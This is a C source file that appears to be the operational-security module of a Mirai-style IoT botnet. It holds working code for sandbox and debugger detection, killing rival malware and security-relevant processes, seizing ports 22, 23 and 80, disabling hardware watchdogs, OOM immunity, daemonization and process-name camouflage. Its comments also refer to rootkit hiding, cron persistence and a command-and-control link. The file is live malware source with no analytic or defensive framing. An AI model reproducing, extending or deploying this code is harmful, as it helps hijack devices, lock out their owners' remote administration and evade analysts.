/* ==========================================================================
 *  opsec.c -- Sandbox detection, daemonization, single instance, system info
 *  Pure C port of opsec.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"
#include <sys/prctl.h>

/* ==========================================================================
 * SYSTEM INFO
 * ========================================================================== */

void charming_kitten(dstr *out) {
    struct utsname u;
    const char *machine;

    ds_init(out);
    if (uname(&u) != 0) {
        ds_set(out, "Linux-unknown");
        return;
    }
    machine = u.machine;

    if (strcmp(machine, "x86_64") == 0) {
        ds_set(out, "Linux-x64");
    } else if (strcmp(machine, "i686") == 0 || strcmp(machine, "i386") == 0) {
        ds_set(out, "Linux-x86");
    } else if (strcmp(machine, "aarch64") == 0) {
        ds_set(out, "Linux-ARM64");
    } else if (strncmp(machine, "arm", 3) == 0) {
        ds_set(out, "Linux-ARM32");
    } else if (strncmp(machine, "mips", 4) == 0) {
        ds_set(out, "Linux-MIPS");
    } else if (strncmp(machine, "ppc", 3) == 0) {
        ds_set(out, "Linux-PowerPC");
    } else if (strcmp(machine, "s390x") == 0) {
        ds_set(out, "Linux-s390x");
    } else if (strncmp(machine, "riscv", 5) == 0) {
        ds_set(out, "Linux-RISCV");
    } else {
        ds_set(out, "Linux-");
        ds_cat(out, machine);
    }
}

int64_t revil_mem(void) {
    struct sysinfo si;
    if (sysinfo(&si) != 0) return 0;
    return (int64_t)((uint64_t)si.totalram * (uint64_t)si.mem_unit / 1024 / 1024);
}

int revil_cpu(void) {
    /* Try /proc/cpuinfo first — works on all Linux including old uClibc */
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "processor", 9) == 0)
                count++;
        }
        fclose(f);
        if (count > 0) return count;
    }
    /* fallback */
    {
        long n = sysconf(_SC_NPROCESSORS_ONLN);
        return (n > 0) ? (int)n : 1;
    }
}

void revil_proc(dstr *out) {
    char buf[4096];
    ssize_t len;
    const char *base;

    ds_init(out);
    len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len <= 0) {
        ds_set(out, "unknown");
        return;
    }
    buf[len] = '\0';
    base = strrchr(buf, '/');
    ds_set(out, base ? base + 1 : buf);
}

/* --------------------------------------------------------------------------
   revil_speed_test — measure upload/download speed via HTTP GET
   Downloads from g_speed_test_url, times the transfer, returns Mbps.
   All in-memory, no disk writes.  Falls back to 0.0 on any failure.
   -------------------------------------------------------------------------- */
static double revil_speed_test(void)
{
    const char *url, *p, *slash, *colon;
    char host[256], port[8], path[512];
    int fd;
    struct addrinfo hints, *res, *rp;
    struct timespec t0, t1;
    char req[1024];
    int req_len;
    size_t total_bytes = 0;
    char buf[8192];
    ssize_t n;
    double elapsed, mbps;
    struct timeval tv;
    int ret;

    ensure_proto();
    url = ds_cstr(&g_speed_test_url);
    if (!url || !url[0]) return 0.0;

    /* parse URL: http://host[:port]/path */
    p = url;
    if (strncmp(p, "http://", 7) == 0)  p += 7;
    else if (strncmp(p, "https://", 8) == 0) return 0.0; /* no TLS */

    slash = strchr(p, '/');
    colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        size_t hlen = (size_t)(colon - p);
        if (hlen >= sizeof(host)) return 0.0;
        memcpy(host, p, hlen); host[hlen] = '\0';
        colon++;
        if (slash) {
            size_t plen = (size_t)(slash - colon);
            if (plen >= sizeof(port)) return 0.0;
            memcpy(port, colon, plen); port[plen] = '\0';
        } else {
            snprintf(port, sizeof(port), "%.*s", (int)(strlen(colon)), colon);
        }
    } else {
        size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
        if (hlen >= sizeof(host)) return 0.0;
        memcpy(host, p, hlen); host[hlen] = '\0';
        strcpy(port, "80");
    }
    if (slash) {
        snprintf(path, sizeof(path), "%s", slash);
    } else {
        strcpy(path, "/");
    }

    /* resolve + connect */
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    ret = getaddrinfo(host, port, &hints, &res);
    if (ret != 0) return 0.0;

    fd = -1;
    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        tv.tv_sec = 10; tv.tv_usec = 0;
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    if (fd < 0) return 0.0;

    /* send HTTP GET */
    req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
        path, host);
    if (write(fd, req, (size_t)req_len) != req_len) {
        close(fd);
        return 0.0;
    }

    /* skip HTTP headers */
    {
        char hdr[8192];
        size_t hdr_len = 0;
        int found = 0;
        while (!found && hdr_len < sizeof(hdr) - 1) {
            n = read(fd, hdr + hdr_len, 1);
            if (n <= 0) break;
            hdr_len++;
            if (hdr_len >= 4 &&
                hdr[hdr_len-4] == '\r' && hdr[hdr_len-3] == '\n' &&
                hdr[hdr_len-2] == '\r' && hdr[hdr_len-1] == '\n')
                found = 1;
        }
        if (!found) { close(fd); return 0.0; }
    }

    /* time the body download */
    clock_gettime(CLOCK_MONOTONIC, &t0);
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        total_bytes += (size_t)n;
    clock_gettime(CLOCK_MONOTONIC, &t1);

    close(fd);

    if (total_bytes < 1024) return 0.0; /* too small to measure */

    elapsed = (double)(t1.tv_sec - t0.tv_sec)
            + (double)(t1.tv_nsec - t0.tv_nsec) / 1e9;
    if (elapsed < 0.001) return 0.0; /* avoid div-by-zero */

    mbps = ((double)total_bytes * 8.0) / (elapsed * 1e6);
    debug_log("revil_speed_test: downloaded %zu bytes in %.3fs = %.2f Mbps",
              total_bytes, elapsed, mbps);
    return mbps;
}

double revil_uplink_cached(void) {
    FILE *f;
    double speed;

    ensure_boot();

    /* check cache first */
    f = fopen(ds_cstr(&g_cache_loc), "r");
    if (f) {
        speed = 0.0;
        if (fscanf(f, "%lf", &speed) == 1 && speed > 0.0) {
            fclose(f);
            debug_log("revil_uplink_cached: Using cached speed: %.2f Mbps", speed);
            return speed;
        }
        fclose(f);
    }

    /* run speed test */
    speed = revil_speed_test();

    /* cache result to avoid re-testing on reconnect */
    if (speed > 0.0) {
        f = fopen(ds_cstr(&g_cache_loc), "w");
        if (f) {
            fprintf(f, "%.2f", speed);
            fclose(f);
        }
    }

    return speed;
}

/* ==========================================================================
 * BOT ID GENERATION (matches Go mustangPanda)
 * SHA256(hostname:mac)[:8]
 * Read MAC from /sys/class/net/<iface>/address (no getifaddrs)
 * ========================================================================== */

void mustang_panda(dstr *out) {
    char hostname[256];
    dstr mac;
    DIR *d;
    struct dirent *ent;
    dstr data;
    dbuf hash;
    dstr hex;

    ds_init(out);
    memset(hostname, 0, sizeof(hostname));
    gethostname(hostname, sizeof(hostname) - 1);

    ds_init(&mac);
    ds_set(&mac, "unknown");

    d = opendir("/sys/class/net");
    if (d) {
        while ((ent = readdir(d)) != NULL) {
            char path[512];
            FILE *f;
            char line[64];

            /* skip . and .. and lo */
            if (ent->d_name[0] == '.') continue;
            if (strcmp(ent->d_name, "lo") == 0) continue;

            snprintf(path, sizeof(path), "/sys/class/net/%s/address", ent->d_name);
            f = fopen(path, "r");
            if (!f) continue;
            if (fgets(line, sizeof(line), f)) {
                /* strip trailing newline */
                size_t slen = strlen(line);
                while (slen > 0 && (line[slen-1] == '\n' || line[slen-1] == '\r'))
                    line[--slen] = '\0';
                if (slen > 0 && strcmp(line, "00:00:00:00:00:00") != 0) {
                    ds_set(&mac, line);
                    fclose(f);
                    break;
                }
            }
            fclose(f);
        }
        closedir(d);
    }

    /* SHA256(hostname:mac)[:8 hex chars = 4 bytes] */
    ds_init(&data);
    ds_set(&data, hostname);
    ds_cat(&data, ":");
    ds_catds(&data, &mac);
    ds_free(&mac);

    hash = sha256_str(ds_cstr(&data));
    ds_free(&data);

    hex = hex_encode(db_ptr(&hash), 4); /* first 4 bytes = 8 hex chars */
    db_free(&hash);

    ds_set(out, ds_cstr(&hex));
    ds_free(&hex);
}

/* ==========================================================================
 * SANDBOX / ANALYSIS DETECTION (matches Go winnti)
 * ========================================================================== */

/* helper: convert char to lowercase */
static char to_lower(char c) {
    return (c >= 'A' && c <= 'Z') ? (char)(c + ('a' - 'A')) : c;
}

/* helper: case-insensitive strstr */
static const char *stristr(const char *haystack, const char *needle) {
    size_t nlen;
    if (!needle || !needle[0]) return haystack;
    nlen = strlen(needle);
    while (*haystack) {
        size_t i;
        int match = 1;
        for (i = 0; i < nlen; i++) {
            if (!haystack[i]) { match = 0; break; }
            if (to_lower(haystack[i]) != to_lower(needle[i])) { match = 0; break; }
        }
        if (match) return haystack;
        haystack++;
    }
    return NULL;
}

/* helper: check if string is all digits (a PID) */
static int is_pid_str(const char *s) {
    if (!s || !*s) return 0;
    while (*s) {
        if (*s < '0' || *s > '9') return 0;
        s++;
    }
    return 1;
}

/*
 * Nanosecond timing check — real hardware completes tight loops in
 * predictable time.  VMs / sandboxes / emulators add measurable overhead
 * on rdtsc-equivalent or clock_gettime calls.  We time a small
 * computation; if the delta exceeds a threshold the environment is suspect.
 */
static int timing_check(void) {
    struct timespec t0, t1, req;
    long delta_ns;
    int round;
    int fails = 0;

    /*
     * Nanosleep evasion: request a 50 ns sleep and measure the actual wall time.
     *
     * On real hardware the kernel timer granularity means nanosleep(50ns)
     * returns in ~50-500 ns — the scheduler simply rounds to the next tick.
     *
     * Sandboxes that intercept/emulate nanosleep either:
     *   - Skip it entirely (delta ≈ 0, but we check for too-long)
     *   - Round up to milliseconds (delta >> 50000 ns)
     *   - Fail to maintain monotonic clock consistency
     *
     * If the measured delay exceeds 500 µs (10000x the requested 50 ns),
     * the environment cannot faithfully handle fine-grained sleeps.
     * Two of three rounds must fail to trigger detection.
     */
    req.tv_sec = 0;
    req.tv_nsec = 50;  /* 50 nanoseconds */

    for (round = 0; round < 3; round++) {
        clock_gettime(CLOCK_MONOTONIC, &t0);
        nanosleep(&req, NULL);
        clock_gettime(CLOCK_MONOTONIC, &t1);

        delta_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);

        if (delta_ns > 50000000L) fails++;  /* >50 ms = sandbox (embedded kernels tick at 100Hz = 10ms) */
    }

    /* Stage 2: syscall timing — 50 trivial getpid() calls.
     * On real HW: ~10-15 µs total. Under ptrace/strace: >1 ms.
     * Catches analysts running the binary under tracing tools. */
    {
        int sf = 0;
        for (round = 0; round < 3; round++) {
            int j;
            clock_gettime(CLOCK_MONOTONIC, &t0);
            for (j = 0; j < 50; j++) getpid();
            clock_gettime(CLOCK_MONOTONIC, &t1);
            delta_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
            if (delta_ns > 1000000L) sf++;  /* >1 ms = traced */
        }
        if (sf >= 2) fails += 2;  /* traced = instant fail */
    }

    return (fails >= 2);
}

int winnti(void) {
    /* ---- Stage 1: nanosecond timing gate (must pass first) ---- */
    if (timing_check()) {
        debug_log("winnti: timing check FAILED — sandbox/emulator suspected");
        return 1;
    }

    /* ---- Stage 2: /proc scan for sandbox VM names only ---- */
    {
        DIR *d;
        struct dirent *ent;

        ensure_killer(); /* decrypts g_sb_names */

        d = opendir("/proc");
        if (d) {
            pid_t self = getpid();
            pid_t parent = getppid();
            while ((ent = readdir(d)) != NULL) {
                char path[512];
                FILE *f;
                char cmdline[4096];
                size_t total;
                size_t k;
                int pid_num;

                if (!is_pid_str(ent->d_name)) continue;
                pid_num = atoi(ent->d_name);
                if (pid_num == (int)self || pid_num == (int)parent) continue;

                snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
                f = fopen(path, "r");
                if (!f) continue;

                total = fread(cmdline, 1, sizeof(cmdline) - 1, f);
                fclose(f);
                if (total == 0) continue;
                {
                    size_t j;
                    for (j = 0; j < total; j++)
                        if (cmdline[j] == '\0') cmdline[j] = ' ';
                }
                cmdline[total] = '\0';

                for (k = 0; k < sa_count(&g_sb_names); k++) {
                    if (stristr(cmdline, sa_get(&g_sb_names, k))) {
                        debug_log("winnti: sandbox name '%s' in PID %s",
                                  sa_get(&g_sb_names, k), ent->d_name);
                        closedir(d);
                        return 1;
                    }
                }
            }
            closedir(d);
        }
    }

    return 0;
}

/* ==========================================================================
 * PROCESS KILLER — scan /proc for competing malware and known IOCs
 * Kills processes matching arch-named binaries, common Mirai IOCs,
 * and other known bot process names.
 * ========================================================================== */

/* IOC patterns decrypted at runtime from g_kill_patterns (via ensure_killer) */

/* kill-by-port: parse /proc/net/tcp for inode, find owning PID, kill it */
static int killer_kill_by_port(int port)
{
    int fd, ret = 0;
    char buf[512];
    char target_inode[32] = {0};
    char port_hex[8];
    uint16_t nport = htons((uint16_t)port);

    /* convert port to hex as it appears in /proc/net/tcp (network byte order) */
    snprintf(port_hex, sizeof(port_hex), "%04X", (unsigned)nport);

    /* step 1: find the inode for a LISTEN socket on this port */
    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd < 0) return 0;

    {
        /* line-by-line read from /proc/net/tcp */
        char linebuf[1024];
        int lpos = 0;
        ssize_t n;
        while ((n = read(fd, buf, sizeof(buf))) > 0) {
            ssize_t i;
            for (i = 0; i < n; i++) {
                if (buf[i] == '\n' || lpos >= (int)sizeof(linebuf) - 1) {
                    linebuf[lpos] = '\0';
                    /* parse: "  sl  local_address ... st ... inode"
                     * local_address is field 1 (0-indexed), format ADDR:PORT
                     * state is field 3, "0A" = LISTEN
                     * inode is field 9 */
                    {
                        char *fields[16];
                        int fc = 0;
                        char *p = linebuf;
                        while (*p && fc < 16) {
                            while (*p == ' ' || *p == '\t') p++;
                            if (!*p) break;
                            fields[fc++] = p;
                            while (*p && *p != ' ' && *p != '\t') p++;
                            if (*p) *p++ = '\0';
                        }
                        /* fields[1] = local_address (ADDR:PORT), fields[3] = state, fields[9] = inode */
                        if (fc >= 10) {
                            char *colon = strrchr(fields[1], ':');
                            if (colon && strcasecmp(colon + 1, port_hex + (port_hex[0] == '0' && port_hex[1] == '0' ? 0 : 0)) == 0) {
                                /* check if port matches (compare raw hex) */
                                unsigned int file_port = 0;
                                sscanf(colon + 1, "%x", &file_port);
                                if (file_port == (unsigned)port) {
                                    /* check state == 0A (LISTEN) */
                                    if (strcmp(fields[3], "0A") == 0) {
                                        strncpy(target_inode, fields[9], sizeof(target_inode) - 1);
                                    }
                                }
                            }
                        }
                    }
                    lpos = 0;
                } else {
                    linebuf[lpos++] = buf[i];
                }
            }
        }
    }
    close(fd);

    if (target_inode[0] == '\0' || strcmp(target_inode, "0") == 0)
        return 0;

    debug_log("killer: port %d -> inode %s", port, target_inode);

    /* step 2: find PID owning this inode via /proc/PID/fd/ symlinks */
    {
        DIR *proc_dir = opendir("/proc");
        struct dirent *pent;
        if (!proc_dir) return 0;

        while ((pent = readdir(proc_dir)) != NULL && ret == 0) {
            char fd_dir_path[256];
            DIR *fd_dir;
            struct dirent *fd_ent;
            int pid;

            if (!is_pid_str(pent->d_name)) continue;
            pid = atoi(pent->d_name);
            if (pid <= 1) continue;

            snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%d/fd", pid);
            fd_dir = opendir(fd_dir_path);
            if (!fd_dir) continue;

            while ((fd_ent = readdir(fd_dir)) != NULL) {
                char link_path[384], link_target[256];
                ssize_t llen;

                snprintf(link_path, sizeof(link_path), "%s/%s", fd_dir_path, fd_ent->d_name);
                llen = readlink(link_path, link_target, sizeof(link_target) - 1);
                if (llen <= 0) continue;
                link_target[llen] = '\0';

                /* symlink looks like "socket:[12345]" */
                if (strncmp(link_target, "socket:[", 8) == 0) {
                    char *inode_start = link_target + 8;
                    char *bracket = strchr(inode_start, ']');
                    if (bracket) *bracket = '\0';
                    if (strcmp(inode_start, target_inode) == 0) {
                        debug_log("killer: port %d held by PID %d, killing", port, pid);
                        kill(pid, SIGKILL);
                        ret = 1;
                        break;
                    }
                }
            }
            closedir(fd_dir);
        }
        closedir(proc_dir);
    }

    return ret;
}

/* steal a port: kill owner, bind to it so nothing else can reclaim it */
static void killer_steal_port(int port)
{
    struct sockaddr_in addr;
    int fd, opt = 1;

    killer_kill_by_port(port);
    usleep(100000); /* 100ms for process to die */

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;

    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((uint16_t)port);

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        listen(fd, 1);
        debug_log("killer: stole port %d", port);
        /* fd intentionally leaked — keeps the port bound */
    } else {
        close(fd);
        debug_log("killer: failed to bind port %d", port);
    }
}

/* Get the bot's own exe path (without " (deleted)" suffix), cached */
static char self_exe_path[4096] = {0};

static void killer_cache_self_exe(void)
{
    ssize_t len;
    char *del;
    if (self_exe_path[0]) return; /* already cached */
    len = readlink("/proc/self/exe", self_exe_path, sizeof(self_exe_path) - 1);
    if (len > 0) {
        self_exe_path[len] = '\0';
        /* strip " (deleted)" if present */
        del = strstr(self_exe_path, " (deleted)");
        if (del) *del = '\0';
    }
}

/* Check if a PID is running our own binary by comparing exe paths */
static int is_self_process(int pid)
{
    char link_path[64];
    char exe[4096];
    char *del;
    ssize_t len;

    snprintf(link_path, sizeof(link_path), "/proc/%d/exe", pid);
    len = readlink(link_path, exe, sizeof(exe) - 1);
    if (len <= 0) return 0;
    exe[len] = '\0';

    /* strip " (deleted)" for comparison */
    del = strstr(exe, " (deleted)");
    if (del) *del = '\0';

    return (self_exe_path[0] && strcmp(exe, self_exe_path) == 0);
}

static void killer_scan_once(void)
{
    pid_t self = getpid();
    pid_t parent = getppid();
    DIR *d;
    struct dirent *ent;

    killer_cache_self_exe();
    ensure_killer(); /* decrypts g_kill_patterns */

    d = opendir("/proc");
    if (!d) return;

    while ((ent = readdir(d)) != NULL) {
        int pid;
        char path[512];
        char cmdline[4096];
        char exe_path[512];
        char exe_buf[4096];
        ssize_t exe_len;
        FILE *f;
        size_t total, j;
        size_t k;

        if (!is_pid_str(ent->d_name)) continue;
        pid = atoi(ent->d_name);
        if (pid <= 1 || pid == (int)self || pid == (int)parent) continue;

        /* skip any process running our own binary (flood forks, etc) */
        if (is_self_process(pid)) continue;

        /* skip our own children (scanner forks that exec sh/wget/etc) */
        {
            char stat_path[64], stat_buf[256];
            int child_ppid = 0;
            FILE *sf;
            snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
            sf = fopen(stat_path, "r");
            if (sf) {
                if (fgets(stat_buf, sizeof(stat_buf), sf)) {
                    /* stat format: pid (comm) state ppid ... */
                    char *cp = strrchr(stat_buf, ')');
                    if (cp && *(cp+1) == ' ' && *(cp+2) && *(cp+3) == ' ') {
                        child_ppid = atoi(cp + 4);
                    }
                }
                fclose(sf);
            }
            if (child_ppid == (int)self) continue;
        }

        /* Read the exe link for this PID */
        snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
        exe_buf[0] = '\0';
        exe_len = readlink(exe_path, exe_buf, sizeof(exe_buf) - 1);
        if (exe_len > 0) exe_buf[exe_len] = '\0';

        /* Kill processes running from deleted binaries — classic competing
         * malware indicator. Skip ourselves (already handled above). */
        if (exe_buf[0] && strstr(exe_buf, " (deleted)") != NULL) {
            debug_log("killer: PID %d running deleted binary [%s], killing", pid, exe_buf);
            kill(pid, SIGKILL);
            continue;
        }

        /* Read cmdline for pattern matching */
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        cmdline[0] = '\0';
        f = fopen(path, "r");
        if (f) {
            total = fread(cmdline, 1, sizeof(cmdline) - 1, f);
            fclose(f);
            cmdline[total] = '\0';
            /* cmdline has NUL separators between args — convert to spaces */
            for (j = 0; j < total; j++) {
                if (cmdline[j] == '\0') cmdline[j] = ' ';
            }
        }

        for (k = 0; k < sa_count(&g_kill_patterns); k++) {
            const char *pat = sa_get(&g_kill_patterns, k);
            if (stristr(cmdline, pat) ||
                (exe_buf[0] && stristr(exe_buf, pat))) {
                debug_log("killer: IOC '%s' matched PID %d [%s], killing",
                          pat, pid, cmdline);
                kill(pid, SIGKILL);
                break;
            }
        }
    }
    closedir(d);
}

static void *killer_thread(void *arg)
{
    (void)arg;

    /* initial delay to let the bot finish starting */
    sleep_ms(5000);

#ifndef DEBUG
    /* steal common ports — kill owners, bind to prevent restart */
    killer_steal_port(23);  /* telnet */
    killer_steal_port(22);  /* ssh */
    killer_steal_port(80);  /* http */
#endif

    debug_log("killer: starting IOC scanner loop");
    for (;;) {
        killer_scan_once();
        /* scan every 30-60 seconds */
        sleep_ms(jitter_ms(30000, 60000));
    }
    return NULL;
}

void killer_start(void)
{
    pthread_t tid;
    pthread_create(&tid, NULL, killer_thread, NULL);
    pthread_detach(tid);
    debug_log("killer: IOC scanner thread started");
}

/* ==========================================================================
 * SINGLE INSTANCE via localhost control port
 *
 * Instead of a PID lock file we bind 127.0.0.1:CTRL_PORT.
 *   - New instance connects and sends magic word → old instance _exit(0)
 *   - bind() is atomic — no stale-PID / PID-reuse races
 *   - PID file is still written for systemd PIDFile= tracking
 * ========================================================================== */

/* Listener thread: accept loop, kill self on magic word from localhost */
static void *ctrl_listener_fn(void *arg) {
    (void)arg;
    for (;;) {
        struct sockaddr_in cli;
        socklen_t clen = sizeof(cli);
        int cfd;
        char buf[32];
        ssize_t n;

        cfd = accept(g_ctrl_fd, (struct sockaddr *)&cli, &clen);
        if (cfd < 0) break; /* fd closed → we're shutting down */

        /* Only accept from 127.0.0.1 */
        if (cli.sin_addr.s_addr != htonl(INADDR_LOOPBACK)) {
            close(cfd);
            continue;
        }

        n = read(cfd, buf, sizeof(buf) - 1);
        close(cfd);

        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, "sweedishsniper")) {
                debug_log("ctrl: magic received, shutting down");
                _exit(0);
            }
        }
    }
    return NULL;
}

/* Try to bind the control port; returns 1 on success, 0 on failure */
static int try_bind_ctrl(void) {
    struct sockaddr_in addr;
    int opt = 1;

    g_ctrl_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (g_ctrl_fd < 0) return 0;

    setsockopt(g_ctrl_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = htons(CTRL_PORT);

    if (bind(g_ctrl_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(g_ctrl_fd);
        g_ctrl_fd = -1;
        return 0;
    }

    listen(g_ctrl_fd, 1);
    fcntl(g_ctrl_fd, F_SETFD, FD_CLOEXEC);
    return 1;
}

/* Send magic word to whatever is listening on the control port.
 * Returns 1 if we connected (something was there), 0 if nothing listening. */
static int send_exit_ctrl(void) {
    struct sockaddr_in addr;
    int fd;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 0;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = htons(CTRL_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        write(fd, "sweedishsniper\n", 15);
        close(fd);
        return 1;
    }
    close(fd);
    return 0;
}

int revil_single_instance(void) {
    pthread_t tid;
    int sent_exit = 0;
    int attempt;

    ensure_boot();
    ensure_persist();

    /* ── Step 1: send EXIT to old instance if port is occupied ── */
    if (send_exit_ctrl()) {
        sent_exit = 1;
        debug_log("revil_single_instance: sent magic on port %d", CTRL_PORT);
        usleep(500000); /* 500 ms for clean shutdown */
    }

    /* ── Step 2: try to bind, retry a few times ── */
    for (attempt = 0; attempt < 3; attempt++) {
        if (try_bind_ctrl()) goto bound;
        if (attempt == 0 && !sent_exit) break; /* nothing was there, bind just failed */
        debug_log("revil_single_instance: bind attempt %d failed, retrying", attempt + 1);
        usleep(300000); /* 300 ms between retries */
    }

    /* ── Step 3: magic word didn't work — escalate to /proc fd kill ── */
    if (sent_exit) {
        debug_log("revil_single_instance: magic ignored, escalating to fd kill");
        killer_kill_by_port(CTRL_PORT);
        usleep(500000);

        if (try_bind_ctrl()) goto bound;
    }

    /* ── Couldn't grab port — carry on without it, CNC handles the edge case ── */
    debug_log("revil_single_instance: port %d unavailable, continuing without control port", CTRL_PORT);
    goto done;

bound:
    debug_log("revil_single_instance: control port %d bound", CTRL_PORT);

    /* ── Start listener thread ── */
    pthread_create(&tid, NULL, ctrl_listener_fn, NULL);
    pthread_detach(tid);

    /* ── Write PID file (systemd PIDFile= still needs it) ── */
    {
        FILE *f = fopen(ds_cstr(&g_lock_loc), "w");
        if (f) {
            char pid_str[32];
            snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
            fputs(pid_str, f);
            fclose(f);
            chmod(ds_cstr(&g_lock_loc), 0600);
        }
    }

    debug_log("revil_single_instance: lock acquired (PID %d, port %d)", (int)getpid(), CTRL_PORT);

done:
    return 1;
}

/* ==========================================================================
 * DAEMONIZATION (matches Go stuxnet)
 * Fork + setsid + redirect fds + ignore signals
 * ========================================================================== */

static void daemon_housekeep(void) {
    int null_fd, fd;

    /* Release any filesystem mount held by CWD */
    (void)chdir("/");
    umask(0);

    ensure_boot();
    null_fd = open(ds_cstr(&g_dev_null_path), O_RDWR);
    if (null_fd >= 0) {
        dup2(null_fd, STDIN_FILENO);
        dup2(null_fd, STDOUT_FILENO);
        dup2(null_fd, STDERR_FILENO);
        if (null_fd > 2) close(null_fd);
    }

    /* Close all inherited file descriptors beyond stderr */
    for (fd = 3; fd < 1024; fd++) close(fd);
    errno = 0; /* clear stale EBADF */

    /* Ignore all terminal and job-control signals */
    signal(SIGHUP,  SIG_IGN);
    signal(SIGINT,  SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGUSR1, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    signal(SIGTTOU, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
}

void stuxnet(int argc, char **argv) {
    pid_t pid;
    sigset_t sigs;
    int wfd;

#ifdef DEBUG
    return;  /* stay in foreground for debug builds */
#endif

    /*
     * Pre-fork hardening — these survive across fork() so the child is
     * protected from the instant it exists, with no signal window.
     */

    /* Block SIGINT at the process mask level (survives fork, immune to
     * library code calling signal()).  Stronger than SIG_IGN. */
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);

    signal(SIGCHLD, SIG_IGN);  /* reap children automatically, no zombies */
    signal(SIGPIPE, SIG_IGN);  /* don't die on broken C2 socket */

    /* Binary stays on disk — rootkit hides it from userland tools.
     * Persistence calls the binary directly via cron instead of re-downloading. */

    /* Disable hardware watchdog so the device doesn't reboot under us */
    if ((wfd = open("/dev/watchdog", O_WRONLY)) != -1 ||
        (wfd = open("/dev/misc/watchdog", O_WRONLY)) != -1) {
        int opt = 0x56425653; /* WDIOS_DISABLECARD (magic close) */
        ioctl(wfd, 0x80045705, &opt); /* WDIOC_SETOPTIONS */
        close(wfd);
    }

    /*
     * Classic double-fork daemon:
     *   1. fork  → parent exits (detach from shell)
     *   2. setsid → new session (detach from controlling terminal)
     *   3. fork  → intermediate exits (child is NOT session leader,
     *              can never reacquire a controlling terminal)
     *   4. housekeep: chdir /, umask 0, redirect stdio, close FDs, signals
     */

    /* First fork — detach from parent/shell */
    pid = fork();
    if (pid < 0) return;
    if (pid > 0) _exit(0);

    /* New session leader */
    setsid();

    /* Second fork — shed session leader status */
    pid = fork();
    if (pid < 0) _exit(0);
    if (pid > 0) _exit(0);

    /* Final daemon process: not a session leader, fully detached */
    daemon_housekeep();

    /* OOM killer immunity — main bot process must survive at all costs.
     * Attack children reset this to 0 in let_em_cook() so OOM
     * sacrifices flood forks instead of us. */
    {
        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (oom_fd >= 0) {
            write(oom_fd, "-1000\n", 6);
            close(oom_fd);
        }
    }

    /* Disguise process name in ps/top */
    ensure_proto(); /* decrypts g_camo_names */
    if (sa_count(&g_camo_names) > 0 && argc > 0 && argv && argv[0]) {
        const char *fake = sa_get(&g_camo_names, urandom_u32() % sa_count(&g_camo_names));
        size_t orig_len = strlen(argv[0]);
        memset(argv[0], 0, orig_len);
        strncpy(argv[0], fake, orig_len);
        prctl(PR_SET_NAME, (unsigned long)fake, 0, 0, 0);
        debug_log("stuxnet: process disguised as '%s'", fake);
    }
}
